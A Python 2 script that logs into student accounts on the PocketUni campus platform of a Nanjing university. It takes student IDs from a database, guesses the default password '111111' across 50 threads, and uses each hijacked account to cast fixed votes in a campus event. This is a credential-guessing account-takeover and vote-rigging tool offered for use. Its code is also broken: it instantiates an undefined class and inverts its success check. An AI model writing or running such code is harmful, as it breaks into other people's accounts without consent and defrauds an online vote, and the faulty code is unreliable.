#!/usr/bin/python
# coding=utf-8
import urllib2
import urllib
import cookielib
import re
import MySQLdb
import threading
import thread

#互斥锁
mylock = thread.allocate_lock()

class PU(threading.Thread):
    index = 0
    def __init__(self):
        threading.Thread.__init__(self)

    def run(self):
        i = 0
        while True:
            if mylock.acquire():
                i = self.index
                self.index = self.index + 1 
                mylock.release()
            if(self.login(stu_list[self.index][0], '111111')):
                pass
                print "Yes"
            else:
                print "NO"

    def login(self, stuid,pas):
        req_url = "http://www.pocketuni.net/"
        request_url = "http://pocketuni.net/index.php?app=home&mod=Public&act=doLogin"
        school = "南京邮电大学"
        headers = {
            "Host": "pocketuni.net",
            "Referer":"http://www.pocketuni.net/",
            "DNT" : "1",
            "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:36.0) Gecko/20100101 Firefox/36.0",
            "Referer": "http://202.119.225.34/default_ysdx.aspx",
            "Content-Type": "application/x-www-form-urlencoded"
        }
        CookieJar = cookielib.CookieJar()

        opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(CookieJar))
        try:
            res = opener.open(req_url)
        except Exception:
            return 1
        p = re.compile("<input type=\"hidden\" name=\"__hash__\" value=\"[^\"]*")
        txt = res.read()

        p = p.findall(txt)
        try:
            p = str(p[0])
    
            s = p.split('value=\"')
            _hash_ = s[1]
        except Exception:
            return 1
        data = {
            "school": school,
            "sid": "592",
            "number": stuid,
            "password": pas,
            "login": "登 录",
            "__hash__": _hash_
        }
        post_data = urllib.urlencode(data)
        req = urllib2.Request(request_url,post_data,headers)
        try:
            opener.open(req)
            res = opener.open("http://njupt.pocketuni.net/")
        except Exception:
            return 1
        txt = res.read()
        failed = "clogin"
        if failed in txt:
            return 1
        toupiaopost_headers = {
            "Host" :"njupt.pocketuni.net",
            "DNT" : "1",
            "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:36.0) Gecko/20100101 Firefox/36.0",
            "Content-Type": "application/x-www-form-urlencoded"
        }
        req_url = "http://njupt.pocketuni.net/index.php?app=event&mod=Front&act=vote"
        toupiao_data = {
            "id" : "85008",
            "pid" : "25139"
        }
        try:
            toupiaopostdata = urllib.urlencode(toupiao_data)
            req1 = urllib2.Request(req_url,toupiaopostdata,toupiaopost_headers)
            opener.open(req1)
            toupiao_data["pid"] = "25081"
            toupiaopostdata = urllib.urlencode(toupiao_data)
            req1 = urllib2.Request(req_url,toupiaopostdata,toupiaopost_headers)
            opener.open(req1)
            toupiao_data["pid"] = "25145"
            toupiaopostdata = urllib.urlencode(toupiao_data)
            req1 = urllib2.Request(req_url,toupiaopostdata,toupiaopost_headers)
            opener.open(req1)
            toupiao_data["pid"] = "25084"
            toupiaopostdata = urllib.urlencode(toupiao_data)
            req1 = urllib2.Request(req_url,toupiaopostdata,toupiaopost_headers)
            opener.open(req1)
            toupiao_data["pid"] = "25465"
            toupiaopostdata = urllib.urlencode(toupiao_data)
            req1 = urllib2.Request(req_url,toupiaopostdata,toupiaopost_headers)
            opener.open(req1)
            toupiao_data["id"] = "85031"
            toupiao_data["pid"] = "25083"
            toupiaopostdata = urllib.urlencode(toupiao_data)
            req1 = urllib2.Request(req_url,toupiaopostdata,toupiaopost_headers)
            opener.open(req1)
            toupiao_data["pid"] = "25445"
            toupiaopostdata = urllib.urlencode(toupiao_data)
            req1 = urllib2.Request(req_url,toupiaopostdata,toupiaopost_headers)
            opener.open(req1)
            toupiao_data["pid"] = "25441"
            toupiaopostdata = urllib.urlencode(toupiao_data)
            req1 = urllib2.Request(req_url,toupiaopostdata,toupiaopost_headers)
            opener.open(req1)
            toupiao_data["pid"] = "25433"
            toupiaopostdata = urllib.urlencode(toupiao_data)
            req1 = urllib2.Request(req_url,toupiaopostdata,toupiaopost_headers)
            opener.open(req1)
            toupiao_data["pid"] = "25425"
            toupiaopostdata = urllib.urlencode(toupiao_data)
            req1 = urllib2.Request(req_url,toupiaopostdata,toupiaopost_headers)
            opener.open(req1)
        except Exception:
            return 1
        return 0

conn = MySQLdb.connect(host="localhost", user="***", passwd="****", db="***", charset="utf8")
mycursor = conn.cursor()
mycursor.execute("select stu_id from info")
stu_list = mycursor.fetchall()
li = []
for i in range(0, 50):
    thread = shua()
    thread.start()
    li.append(thread)
